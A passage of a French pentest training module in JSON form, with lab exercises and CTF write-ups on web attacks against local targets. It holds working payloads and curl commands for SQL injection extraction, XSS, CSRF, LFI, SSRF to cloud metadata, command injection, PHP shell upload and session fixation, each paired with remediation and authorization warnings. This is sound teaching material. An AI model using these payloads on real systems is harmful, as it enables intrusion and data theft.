          "Règles contournées",
          "Prix négatif, quantité énorme, étape sautée",
          "Validation serveur, machine à états, limites"
        ]
      ]
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Choisir un point d’entrée",
          "p": "Sélectionnez un paramètre, un formulaire, un en-tête ou un fichier. Notez la requête initiale et la réponse attendue."
        },
        {
          "h": "Étape 2 — Tester une entrée anodine",
          "p": "Envoyez une valeur normale et vérifiez qu'elle est reflétée, utilisée dans une requête ou stockée. Cela révèle le contexte."
        },
        {
          "h": "Étape 3 — Injecter un payload de lab",
          "p": "Utilisez un payload minimal et non destructif. Pour SQLi, commencez par une condition vraie/fausse. Pour XSS, utilisez une alerte."
        },
        {
          "h": "Étape 4 — Observer la réponse",
          "p": "Comparez les réponses, les erreurs, les délais et les journaux. Un changement de comportement est un indice, pas encore une preuve."
        },
        {
          "h": "Étape 5 — Prouver l’impact",
          "p": "Montrez l'accès à une donnée de lab, l'exécution d'un script ou le contournement d'une règle. Restez dans le périmètre."
        },
        {
          "h": "Étape 6 — Corriger",
          "p": "Proposez une correction à la bonne couche : validation, requête paramétrée, encodage, autorisation, limitation, journalisation."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Payloads de laboratoire — SQLi, XSS, CSRF, LFI, SSRF",
      "x": "# LAB AUTORISÉ UNIQUEMENT — cibles vulnérables de lab (DVWA, Juice Shop, WebGoat)\n\n# SQLi — vérifier le nombre de colonnes puis extraire une donnée de lab\nid=1' ORDER BY 1-- -\nid=1' UNION SELECT 1,2,3-- -\nid=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -\n\n# XSS — preuve d exécution dans le navigateur de lab\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n\n# CSRF — formulaire auto-soumis sur un compte de test\n<form action=\"http://site.local/admin/change_password.php\" method=\"POST\">\n  <input name=\"new_password\" value=\"P@ssw0rd-Lab!\">\n</form>\n<script>document.forms[0].submit()</script>\n\n# LFI — lecture d un fichier de lab\nhttp://site.local/index.php?page=../../../../etc/passwd\n\n# SSRF — cible interne de lab\nhttp://site.local/fetch?url=http://127.0.0.1:8081/\nhttp://site.local/fetch?url=http://169.254.169.254/latest/meta-data/\n\n# Injection de commande — test non destructif\n; id\n| whoami\n$(id)"
    },
    {
      "t": "callout",
      "v": "danger",
      "title": "Payloads uniquement en laboratoire",
      "x": "Ces chaînes sont fournies pour comprendre et corriger. Ne les envoyez jamais à un site distant sans autorisation écrite. Sur un clone, utilisez une base de données et des comptes jetables."
    },
    {
      "t": "mini",
      "items": [
        {
          "v": "lime",
          "h": "Méthode",
          "p": "Un payload à la fois, une hypothèse à la fois, une preuve à la fois. Notez la requête exacte et la réponse."
        },
        {
          "v": "amber",
          "h": "Piège",
          "p": "Confondre erreur applicative et vulnérabilité. Un message d'erreur n'est pas toujours exploitable."
        },
        {
          "v": "red",
          "h": "Risque",
          "p": "Injections sur des systèmes réels, extraction de données personnelles, défiguration ou déni de service."
        }
      ]
    },
    {
      "t": "h",
      "x": "31.8 API, upload de fichiers et escalade de privilèges"
    },
    {
      "t": "p",
      "x": "Les API sont souvent moins protégées que l'interface web : absence de contrôle de rôle, objets exposés, mass assignment, limitation de débit absente, jetons trop longs ou non révocables. Les uploads ajoutent une surface supplémentaire : validation du type, du contenu, du nom, du dossier de destination et des permissions. Enfin, l'escalade de privilèges consiste à passer d'un compte standard à un compte administrateur, ou d'un conteneur à l'hôte, dans le lab."
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Tests d’API, d’upload et d’escalade",
      "x": "# LAB AUTORISÉ UNIQUEMENT\nTARGET=\"http://site.local\"\n\n# 1) Cartographier les endpoints API\ncurl -s \"$TARGET/api/\" | jq .\nffuf -u \"$TARGET/api/FUZZ\" -w api-wordlist.txt -mc 200,201,204,401,403\n\n# 2) Tester les rôles avec deux jetons de lab\ncurl -s -H \"Authorization: Bearer $USER_TOKEN\" \"$TARGET/api/admin/users\" | jq .\ncurl -s -H \"Authorization: Bearer $ADMIN_TOKEN\" \"$TARGET/api/admin/users\" | jq .\n\n# 3) Mass assignment : ajouter un champ role dans une mise à jour de profil\ncurl -s -X PATCH \"$TARGET/api/users/1\" \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"Test\",\"role\":\"admin\"}'\n\n# 4) Upload : tester extension, type MIME et contenu\ncurl -s -b cookies.txt -F \"file=@shell.php;type=image/jpeg\" \"$TARGET/upload.php\"\ncurl -s -b cookies.txt -F \"file=@image.jpg;filename=shell.php\" \"$TARGET/upload.php\"\n\n# 5) Vérifier l accès au fichier uploadé\ncurl -s \"$TARGET/uploads/shell.php\"\n\n# 6) Escalade locale dans le conteneur de lab (si autorisé)\nid\nsudo -l\nfind / -perm -4000 -type f 2>/dev/null"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Cartographier l’API",
          "p": "Identifiez les routes, les méthodes, les paramètres, les formats de réponse et les mécanismes d'authentification. Utilisez la documentation, le code source du clone ou une wordlist API."
        },
        {
          "h": "Étape 2 — Tester l’autorisation",
          "p": "Avec un jeton standard, essayez les routes admin. Vérifiez si le serveur contrôle le rôle ou seulement la présence d'un jeton."
        },
        {
          "h": "Étape 3 — Tester le mass assignment",
          "p": "Ajoutez des champs sensibles (role, is_admin, balance) dans les requêtes de mise à jour. Vérifiez s'ils sont acceptés."
        },
        {
          "h": "Étape 4 — Tester l’upload",
          "p": "Essayez les extensions alternatives, les doubles extensions, les types MIME falsifiés et les fichiers polyglottes. Vérifiez où le fichier est stocké et s'il est exécutable."
        },
        {
          "h": "Étape 5 — Tester l’escalade",
          "p": "Dans le lab, vérifiez les droits sudo, les binaires SUID, les tâches cron et les permissions. Ne sortez pas du conteneur ou de la VM de lab."
        },
        {
          "h": "Étape 6 — Prouver et corriger",
          "p": "Montrez l'accès à une ressource admin de lab ou l'exécution d'une commande de test. Proposez une vérification serveur, une liste blanche et un stockage hors webroot."
        }
      ]
    },
    {
      "t": "table",
      "head": [
        "Faiblesse",
        "Indice",
        "Impact potentiel",
        "Remédiation"
      ],
      "rows": [
        [
          "API sans contrôle de rôle",
          "Un jeton standard accède à /api/admin",
          "Fuite de données, action administrative",
          "Vérifier le rôle côté serveur, policy centralisée"
        ],
        [
          "Mass assignment",
          "Le champ role est accepté",
          "Escalade de privilèges",
          "Liste blanche de champs, DTO explicites"
        ],
        [
          "JWT faible",
          "Signature non vérifiée ou secret devinable",
          "Usurpation de compte",
          "Vérifier la signature, secret fort, rotation, expiration courte"
        ],
        [
          "Upload non validé",
          "Fichier PHP accepté en image",
          "Exécution de code",
          "Valider le type réel, renommer, stocker hors webroot, permissions"
        ],
        [
          "IDOR",
          "Changement d’ID dans l’URL",
          "Accès aux données d’autrui",
          "Autorisation par objet, tests automatisés"
        ],
        [
          "Absence de rate limit",
          "Brute force possible",
          "Compromission de compte",
          "Limitation, verrouillage progressif, MFA"
        ],
        [
          "Escalade locale",
          "SUID ou sudo mal configuré",
          "Contrôle du conteneur/hôte de lab",
          "Moindre privilège, audit des SUID/sudo"
        ]
      ]
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "Chaîner les faiblesses",
      "x": "En pentest, une vulnérabilité faible peut en amplifier une autre : un IDOR qui expose un jeton, un upload qui mène à une exécution, une API qui permet de devenir admin. Dans le lab, entraînez-vous à documenter la chaîne complète et l'impact réel."
    },
    {
      "t": "h",
      "x": "31.9 Labs avancés pas à pas"
    },
    {
      "t": "p",
      "x": "Les trois labs ci-dessous sont progressifs. Ils supposent que vous disposez d'un site de lab ou d'une application vulnérable. Remplacez les chemins et les URLs par ceux de votre environnement. Chaque lab doit être réalisé dans une VM isolée, avec un snapshot avant de commencer."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Lab A — Cloner, héberger et auditer un site statique de lab",
      "x": "Objectif : partir d'une archive statique de lab, la servir localement, découvrir un fichier de sauvegarde oublié et récupérer un flag. Compétences : clonage, hébergement, reconnaissance, analyse de fichiers exposés."
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Préparer",
          "p": "Créez le dossier lab/m31/labA, copiez l'archive static-site.zip fournie avec le lab et calculez son hash SHA-256."
        },
        {
          "h": "Étape 2 — Extraire",
          "p": "Décompressez l'archive dans un dossier site. Inspectez l'arborescence, les fichiers de configuration, les commentaires HTML et les scripts."
        },
        {
          "h": "Étape 3 — Servir",
          "p": "Lancez un serveur HTTP local sur le port 8080 et vérifiez que la page d'accueil répond."
        },
        {
          "h": "Étape 4 — Cloner",
          "p": "Clonez le site avec wget pour vérifier les liens et les ressources. Comparez le clone avec l'original."
        },
        {
          "h": "Étape 5 — Découvrir",
          "p": "Utilisez ffuf avec des extensions de sauvegarde (.bak, .zip, .old, .git/HEAD) et testez les chemins classiques."
        },
        {
          "h": "Étape 6 — Analyser",
          "p": "Ouvrez le fichier de sauvegarde trouvé, cherchez des identifiants de lab, des commentaires et le flag."
        },
        {
          "h": "Étape 7 — Prouver",
          "p": "Conservez la requête HTTP, le code de réponse, le contenu du fichier et l'horodatage. Hashez les preuves."
        },
        {
          "h": "Étape 8 — Corriger",
          "p": "Proposez de supprimer les fichiers de sauvegarde du webroot, de bloquer les extensions sensibles et d'ajouter une vérification en CI."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Lab A — Commandes",
      "x": "# LAB AUTORISÉ UNIQUEMENT\nmkdir -p lab/m31/labA/{site,clone,preuves,logs}\ncp /chemin/vers/static-site.zip lab/m31/labA/\nsha256sum lab/m31/labA/static-site.zip | tee lab/m31/labA/preuves/archive.sha256\nunzip -q lab/m31/labA/static-site.zip -d lab/m31/labA/site\nfind lab/m31/labA/site -maxdepth 3 -type f | sort | head -50\n\n# Servir le site\npython3 -m http.server 8080 --directory lab/m31/labA/site &\ncurl -I http://127.0.0.1:8080/\n\n# Cloner et découvrir\nwget --mirror --convert-links --page-requisites --no-parent \\\n  -P lab/m31/labA/clone http://127.0.0.1:8080/\nffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt \\\n  -e .bak,.zip,.old,.git/HEAD -mc 200,301,302,403 | tee lab/m31/labA/logs/ffuf.txt\n\n# Lire le flag de lab\ncurl -s http://127.0.0.1:8080/backup/flag.txt"
    },
    {
      "t": "p",
      "x": "<strong>Résultat attendu :</strong> le site répond, le clone contient les pages principales, ffuf révèle un fichier de sauvegarde ou un répertoire oublié, et le flag <code>flag{m31_labA_backup}</code> est récupéré. Documentez le chemin exact et la correction."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Lab B — Reconstruire un site dynamique et contourner l’authentification de lab",
      "x": "Objectif : importer une base de données de lab, démarrer une pile Docker, tester les identifiants par défaut, les cookies et la fixation de session, puis accéder à une zone admin de lab."
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Préparer la pile",
          "p": "Créez le docker-compose.yml du chapitre 31.3, placez le code du site dans ./site et le dump dans ./db."
        },
        {
          "h": "Étape 2 — Démarrer",
          "p": "Lancez docker compose up -d, consultez les logs et vérifiez que le site et Adminer répondent."
        },
        {
          "h": "Étape 3 — Importer",
          "p": "Importez le dump de lab, vérifiez les tables users et sessions, et identifiez les comptes de test."
        },
        {
          "h": "Étape 4 — Tester les identifiants",
          "p": "Essayez les comptes de démonstration documentés. Notez les réponses et les cookies."
        },
        {
          "h": "Étape 5 — Analyser la session",
          "p": "Vérifiez les attributs du cookie, la durée de vie et le changement d'identifiant après connexion."
        },
        {
          "h": "Étape 6 — Tester la fixation",
          "p": "Obtenez un cookie avant connexion, connectez-vous, comparez l'identifiant. S'il est identique, la fixation est possible."
        },
        {
          "h": "Étape 7 — Accéder à l’admin",
          "p": "Utilisez le cookie de session obtenu pour accéder à la page admin de lab et récupérer le flag."
        },
        {
          "h": "Étape 8 — Prouver",
          "p": "Conservez les requêtes, les cookies, les captures et l'horodatage. Ne conservez pas de secrets réels."
        },
        {
          "h": "Étape 9 — Corriger",
          "p": "Régénérer l'identifiant de session après connexion, ajouter HttpOnly/Secure/SameSite, limiter les tentatives et supprimer les comptes de démonstration."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Lab B — Commandes",
      "x": "# LAB AUTORISÉ UNIQUEMENT\nmkdir -p lab/m31/labB/{site,db,logs,preuves}\ndocker compose up -d\ndocker compose ps\ndocker exec -i m31_db mariadb -u root -plabroot labdb < lab/m31/labB/db/backup.sql\ndocker exec -it m31_db mariadb -u root -plabroot -e \"SHOW TABLES; SELECT id,username,role FROM users;\" labdb\n\n# Identifiants par défaut (compte de lab)\ncurl -i -c lab/m31/labB/logs/cookies.txt -d \"username=admin&password=admin\" http://127.0.0.1:8080/login.php\n\n# Vérifier les attributs du cookie\ngrep -i \"set-cookie\" lab/m31/labB/logs/cookies.txt\n\n# Fixation de session\ncurl -c before.txt http://127.0.0.1:8080/login.php > /dev/null\ncurl -b before.txt -c after.txt -d \"username=user&password=user\" http://127.0.0.1:8080/login.php\ndiff <(grep -o \"PHPSESSID[^;]*\" before.txt) <(grep -o \"PHPSESSID[^;]*\" after.txt)\n\n# Accès admin de lab\ncurl -s -b after.txt http://127.0.0.1:8080/admin.php | grep -i flag"
    },
    {
      "t": "p",
      "x": "<strong>Résultat attendu :</strong> la pile démarre, la base est importée, un compte de démonstration ou une session mal protégée permet d'accéder à la zone admin de lab, et le flag <code>flag{m31_labB_session}</code> est récupéré. Le write-up doit expliquer la cause exacte et la correction."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Lab C — Chaîne API + IDOR + upload",
      "x": "Objectif : enchaîner un IDOR qui expose un jeton, un upload mal validé et une API sans contrôle de rôle pour obtenir un accès administrateur de lab. Ce lab montre comment des faiblesses moyennes deviennent critiques lorsqu'elles sont chaînées."
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Cartographier",
          "p": "Identifiez les endpoints /api/users, /api/files, /api/admin et le formulaire d'upload. Notez les méthodes et les jetons nécessaires."
        },
        {
          "h": "Étape 2 — Créer deux comptes",
          "p": "Utilisez deux comptes de lab, l'un standard et l'autre administrateur. Connectez-vous et récupérez les jetons."
        },
        {
          "h": "Étape 3 — Tester l’IDOR",
          "p": "Avec le jeton standard, changez l'identifiant dans /api/users/1 et /api/users/2. Comparez les réponses."
        },
        {
          "h": "Étape 4 — Extraire un jeton",
          "p": "Un des objets exposés contient un jeton ou une référence de fichier. Utilisez-le pour accéder à une ressource protégée de lab."
        },
        {
          "h": "Étape 5 — Tester l’upload",
          "p": "Téléversez un fichier de test avec une extension alternative ou un type MIME falsifié. Vérifiez s'il est accessible et exécutable."
        },
        {
          "h": "Étape 6 — Appeler l’API admin",
          "p": "Avec le jeton ou le rôle obtenu, appelez /api/admin/flag et vérifiez la réponse."
        },
        {
          "h": "Étape 7 — Prouver la chaîne",
          "p": "Documentez chaque étape avec la requête, la réponse, le rôle utilisé et l'impact. Expliquez pourquoi la chaîne fonctionne."
        },
        {
          "h": "Étape 8 — Corriger",
          "p": "Ajouter une autorisation par objet, vérifier le rôle côté serveur, valider l'upload et limiter la portée des jetons."
        },
        {
          "h": "Étape 9 — Nettoyer",
          "p": "Supprimez les fichiers uploadés, révoquez les jetons de lab et restaurez le snapshot."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Lab C — Commandes",
      "x": "# LAB AUTORISÉ UNIQUEMENT\n# Jetons de deux comptes de lab\nUSER_TOKEN=\"...\"\nADMIN_TOKEN=\"...\"\n\n# IDOR\ncurl -s -H \"Authorization: Bearer $USER_TOKEN\" http://127.0.0.1:8080/api/users/1 | jq .\ncurl -s -H \"Authorization: Bearer $USER_TOKEN\" http://127.0.0.1:8080/api/users/2 | jq .\n\n# Upload avec extension alternative\nprintf \"<?php echo 'LAB-OK'; ?>\" > lab/m31/labC/test.php\ncurl -s -b cookies.txt -F \"file=@lab/m31/labC/test.php;type=image/jpeg\" http://127.0.0.1:8080/upload.php\n\n# Vérifier l accès au fichier\ncurl -s http://127.0.0.1:8080/uploads/test.php\n\n# API admin avec le jeton obtenu\ncurl -s -H \"Authorization: Bearer $USER_TOKEN\" http://127.0.0.1:8080/api/admin/flag | jq .\n\n# Vérification de rôle côté serveur (doit être refusé)\ncurl -s -o /dev/null -w \"%{http_code}\\n\" -H \"Authorization: Bearer $USER_TOKEN\" http://127.0.0.1:8080/api/admin/users"
    },
    {
      "t": "p",
      "x": "<strong>Résultat attendu :</strong> l'IDOR expose une ressource ou un jeton de lab, l'upload permet d'écrire un fichier accessible, et l'API admin répond avec le flag <code>flag{m31_labC_chain}</code> lorsque le contrôle de rôle est absent. Le rapport doit présenter la chaîne complète et les corrections à chaque étape."
    },
    {
      "t": "callout",
      "v": "warn",
      "title": "Nettoyage obligatoire",
      "x": "Après chaque lab, supprimez les fichiers uploadés, révoquez les comptes et jetons de test, arrêtez les conteneurs et restaurez le snapshot. Un lab propre est un lab reproductible."
    },
    {
      "t": "h",
      "x": "31.10 10 exercices avancés"
    },
    {
      "t": "p",
      "x": "Les exercices ci-dessous couvrent l'ensemble du module. Réalisez-les dans l'ordre ou choisissez ceux qui correspondent à vos lacunes. Pour chaque exercice, conservez les commandes, les captures, les résultats et une conclusion courte."
    },
    {
      "t": "table",
      "head": [
        "#",
        "Titre",
        "Niveau",
        "Consigne",
        "Livrable attendu"
      ],
      "rows": [
        [
          "1",
          "Clone statique avec wget",
          "facile",
          "Clonez le site de lab http://127.0.0.1:8080 avec wget en mode miroir, conversion des liens et ressources nécessaires. Vérifiez le rendu et listez les ressources manquantes.",
          "Arborescence du clone, commande exacte, liste des écarts, captures avant/après."
        ],
        [
          "2",
          "Comparaison wget vs HTTrack",
          "moyen",
          "Clonez le même site avec HTTrack, comparez le nombre de fichiers, les liens et le rendu. Expliquez les différences et choisissez l'outil le plus adapté.",
          "Tableau comparatif, conclusion argumentée, recommandation."
        ],
        [
          "3",
          "Capture authentifiée via proxy",
          "moyen",
          "Configurez Burp/ZAP ou mitmproxy sur un site de lab avec authentification. Capturez les requêtes, exportez les ressources utiles et reconstruisez le parcours.",
          "Export proxy, journal des requêtes, captures, limites de la capture."
        ],
        [
          "4",
          "Reconstruction Docker + base",
          "difficile",
          "Écrivez un docker-compose.yml avec web PHP, MariaDB et Adminer. Importez le dump de lab, configurez le vhost et prouvez que le site fonctionne.",
          "compose.yml, configuration serveur, commandes d'import, preuve de fonctionnement."
        ],
        [
          "5",
          "DNS local et TLS",
          "moyen",
          "Configurez site.local dans le fichier hosts, générez un certificat local, testez avec curl et vérifiez la chaîne de confiance.",
          "Extrait hosts, certificat, sortie curl, explication des attributs."
        ],
        [
          "6",
          "Recon outillée",
          "moyen",
          "Cartographiez le clone avec nmap, whatweb, ffuf/gobuster et nikto. Classez les services et endpoints par risque.",
          "Rapport de recon, tableau des endpoints, priorisation."
        ],
        [
          "7",
          "Authentification et session",
          "difficile",
          "Testez les identifiants par défaut, les cookies, la fixation de session et un JWT de lab. Prouvez au moins un défaut et proposez la correction.",
          "Requêtes/réponses, preuve, analyse de cause, remédiation."
        ],
        [
          "8",
          "Injections et logique métier",
          "difficile",
          "Testez SQLi, XSS, CSRF et LFI sur le clone de lab. Montrez une preuve non destructive et la correction associée.",
          "Payloads, captures, impact, correctifs, tests de non-régression."
        ],
        [
          "9",
          "API, upload et IDOR",
          "difficile",
          "Enchaînez un IDOR, un upload contourné et un contrôle d'autorisation API. Mesurez l'impact en lab et documentez la chaîne.",
          "Chaîne d'exploitation, preuves, matrice d'impact, corrections."
        ],
        [
          "10",
          "Rapport avancé",
          "moyen",
          "Rédigez un rapport de pentest du clone : périmètre, méthodologie, constats, CVSS, preuves, remédiations et annexes.",
          "Rapport structuré (PDF/MD), checklist, synthèse exécutive."
        ]
      ]
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Critère 1 — Reproductibilité",
          "p": "Une autre personne doit pouvoir refaire l'exercice avec vos commandes et vos versions."
        },
        {
          "h": "Critère 2 — Preuve",
          "p": "Chaque constat est accompagné d'une requête, d'une réponse, d'une capture et d'un horodatage."
        },
        {
          "h": "Critère 3 — Impact",
          "p": "Vous expliquez l'impact réel dans le contexte du lab, sans exagérer ni minimiser."
        },
        {
          "h": "Critère 4 — Remédiation",
          "p": "La correction est concrète, testable et associée à un délai ou une priorité."
        },
        {
          "h": "Critère 5 — Éthique",
          "p": "Vous respectez le périmètre, vous ne conservez pas de données inutiles et vous nettoyez le lab."
        }
      ]
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "Barème suggéré",
      "x": "Chaque exercice peut être noté sur 10 : 3 points pour la méthode, 3 pour la preuve, 2 pour l'analyse d'impact, 2 pour la remédiation. Un exercice sans preuve reproductible ne peut pas dépasser 5/10."
    },
    {
      "t": "h",
      "x": "31.11 5 CTF avancés avec write-ups"
    },
    {
      "t": "p",
      "x": "Les cinq CTF ci-dessous sont conçus pour un lab local. Chaque défi fournit un objectif, un environnement, des indices, une procédure détaillée et une remédiation. Les flags sont des marqueurs de lab : ils ne doivent jamais être utilisés sur un système réel. Remplacez les URLs et les chemins par ceux de votre environnement."
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "CTF 1/5 — Le backup oublié",
      "x": "<strong>Objectif :</strong> cloner un site statique de lab, le servir localement, découvrir un fichier de sauvegarde exposé et récupérer le flag.<br><strong>Environnement :</strong> archive static-site.zip, serveur local sur 127.0.0.1:8080.<br><strong>Flag attendu :</strong> <code>flag{m31_ctf1_backup_web}</code>"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Préparer",
          "p": "Copiez l'archive de lab, calculez son hash et extrayez-la dans un dossier dédié."
        },
        {
          "h": "Étape 2 — Servir",
          "p": "Lancez python3 -m http.server 8080 dans le dossier du site et vérifiez la page d'accueil."
        },
        {
          "h": "Étape 3 — Cloner",
          "p": "Clonez le site avec wget pour observer les liens et les ressources. Notez les répertoires présents."
        },
        {
          "h": "Étape 4 — Découvrir",
          "p": "Lancez ffuf avec les extensions .bak, .zip, .old, .sql et testez .git/HEAD, backup/, db/."
        },
        {
          "h": "Étape 5 — Exploiter",
          "p": "Ouvrez le fichier de sauvegarde trouvé, inspectez son contenu et localisez le flag."
        },
        {
          "h": "Étape 6 — Prouver",
          "p": "Conservez la requête, le code HTTP, le contenu et l'horodatage. Hashez la preuve."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Write-up CTF 1 — Le backup oublié",
      "x": "CTF 1/5 — Le backup oublié\nFlag : flag{m31_ctf1_backup_web}\n\n# 1. Extraire et servir\nunzip -q static-site.zip -d lab/m31/ctf1/site\npython3 -m http.server 8080 --directory lab/m31/ctf1/site &\n\n# 2. Découverte de fichiers\nffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt \\\n  -e .bak,.zip,.old,.sql -mc 200,301,302,403\n\n# Résultat attendu : /backup/ ou /site.zip.bak\ncurl -s http://127.0.0.1:8080/backup/site.zip.bak -o lab/m31/ctf1/backup.zip\nunzip -l lab/m31/ctf1/backup.zip\nunzip -q lab/m31/ctf1/backup.zip -d lab/m31/ctf1/backup\ngrep -R \"flag{\" lab/m31/ctf1/backup\n\n# Preuve\nsha256sum lab/m31/ctf1/backup.zip | tee lab/m31/ctf1/preuve.sha256\n\nRemédiation : supprimer les archives du webroot, bloquer les extensions sensibles,\najouter un contrôle CI qui échoue si un .bak/.zip/.sql est publié."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Remédiation CTF 1",
      "x": "Interdire l'accès aux fichiers de sauvegarde et de configuration, nettoyer le webroot avant déploiement, ajouter une règle serveur pour les extensions sensibles et vérifier les artefacts publiés en CI."
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "CTF 2/5 — La session piégée",
      "x": "<strong>Objectif :</strong> contourner l'authentification d'un site dynamique de lab en exploitant un compte de démonstration ou une fixation de session, puis accéder à la zone admin.<br><strong>Environnement :</strong> pile Docker du chapitre 31.3, deux comptes de lab.<br><strong>Flag attendu :</strong> <code>flag{m31_ctf2_session_admin}</code>"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Démarrer",
          "p": "Lancez la pile Docker et importez le dump de lab. Vérifiez que la page de connexion répond."
        },
        {
          "h": "Étape 2 — Tester les comptes",
          "p": "Essayez les identifiants de démonstration documentés (admin/admin, test/test). Notez les réponses."
        },
        {
          "h": "Étape 3 — Analyser les cookies",
          "p": "Inspectez les attributs Set-Cookie, la durée de vie et le nom du cookie de session."
        },
        {
          "h": "Étape 4 — Tester la fixation",
          "p": "Obtenez un cookie avant connexion, connectez-vous, comparez l'identifiant. S'il ne change pas, la fixation est possible."
        },
        {
          "h": "Étape 5 — Accéder à l’admin",
          "p": "Utilisez le cookie de session valide pour appeler admin.php et récupérer le flag."
        },
        {
          "h": "Étape 6 — Documenter",
          "p": "Conservez les requêtes, les cookies, les captures et la cause racine. Proposez la régénération de session et les attributs de cookie."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Write-up CTF 2 — La session piégée",
      "x": "CTF 2/5 — La session piégée\nFlag : flag{m31_ctf2_session_admin}\n\n# 1. Connexion avec un compte de démonstration de lab\ncurl -i -c cookies.txt -d \"username=admin&password=admin\" http://127.0.0.1:8080/login.php\n\n# 2. Vérifier les attributs du cookie\ngrep -i \"set-cookie\" cookies.txt\n# Chercher : HttpOnly, Secure, SameSite, expiration\n\n# 3. Fixation de session\ncurl -c before.txt http://127.0.0.1:8080/login.php > /dev/null\ncurl -b before.txt -c after.txt -d \"username=user&password=user\" http://127.0.0.1:8080/login.php\ndiff <(grep -o \"PHPSESSID[^;]*\" before.txt) <(grep -o \"PHPSESSID[^;]*\" after.txt)\n\n# 4. Accès admin\ncurl -s -b after.txt http://127.0.0.1:8080/admin.php | grep -i \"flag\"\n\nRemédiation : régénérer l ID de session après connexion, supprimer les comptes de démo,\najouter HttpOnly/Secure/SameSite, limiter les tentatives et journaliser les échecs."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Remédiation CTF 2",
      "x": "Régénérer l'identifiant de session à chaque authentification, supprimer les comptes de démonstration en production, configurer les cookies avec HttpOnly, Secure et SameSite, et ajouter une limitation des tentatives avec alerting."
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "CTF 3/5 — L’injection dans le clone",
      "x": "<strong>Objectif :</strong> exploiter une injection SQL dans une application de lab pour extraire le flag stocké dans une table dédiée.<br><strong>Environnement :</strong> application vulnérable de lab (DVWA/Juice Shop/WebGoat) ou clone avec module SQLi.<br><strong>Flag attendu :</strong> <code>flag{m31_ctf3_sql_union}</code>"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Identifier le paramètre",
          "p": "Repérez un paramètre utilisé dans une requête (id, catégorie, recherche). Testez une valeur normale et une apostrophe."
        },
        {
          "h": "Étape 2 — Confirmer l’injection",
          "p": "Comparez une condition vraie et une condition fausse. Observez les erreurs, les différences de contenu ou de délai."
        },
        {
          "h": "Étape 3 — Déterminer les colonnes",
          "p": "Utilisez ORDER BY ou UNION SELECT avec un nombre croissant de colonnes jusqu'à obtenir une réponse valide."
        },
        {
          "h": "Étape 4 — Extraire les métadonnées",
          "p": "Listez les tables et les colonnes de la base de lab, puis identifiez la table contenant le flag."
        },
        {
          "h": "Étape 5 — Récupérer le flag",
          "p": "Utilisez une requête UNION pour afficher le contenu de la table flags. Ne lisez que les données nécessaires."
        },
        {
          "h": "Étape 6 — Corriger",
          "p": "Proposez des requêtes paramétrées, une validation stricte et un compte de base de données à privilèges limités."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Write-up CTF 3 — L’injection dans le clone",
      "x": "CTF 3/5 — L’injection dans le clone\nFlag : flag{m31_ctf3_sql_union}\n\n# 1. Confirmer l injection\ncurl -s \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1'&Submit=Submit\"\ncurl -s \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit\"\n\n# 2. Colonnes\ncurl -s \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' ORDER BY 2-- -&Submit=Submit\"\ncurl -s \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,2-- -&Submit=Submit\"\n\n# 3. Tables et colonnes\ncurl -s \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -&Submit=Submit\"\ncurl -s \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='flags'-- -&Submit=Submit\"\n\n# 4. Flag\ncurl -s \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' UNION SELECT 1,group_concat(flag) FROM flags-- -&Submit=Submit\"\n\nRemédiation : requêtes paramétrées (PDO/mysqli), validation stricte, moindre privilège DB,\ngestion des erreurs sans fuite, WAF en défense en profondeur."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Remédiation CTF 3",
      "x": "Utiliser des requêtes préparées pour toutes les entrées, valider les types et formats, limiter les privilèges du compte de base de données, désactiver l'affichage des erreurs en production et journaliser les requêtes anormales."
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "CTF 4/5 — IDOR et upload",
      "x": "<strong>Objectif :</strong> exploiter un IDOR pour accéder au fichier privé d'un autre utilisateur de lab, puis utiliser un upload mal validé pour exécuter une commande de test et récupérer le flag.<br><strong>Environnement :</strong> application de lab avec /api/users/{id} et /upload.php.<br><strong>Flag attendu :</strong> <code>flag{m31_ctf4_idor_upload}</code>"
    },
    {
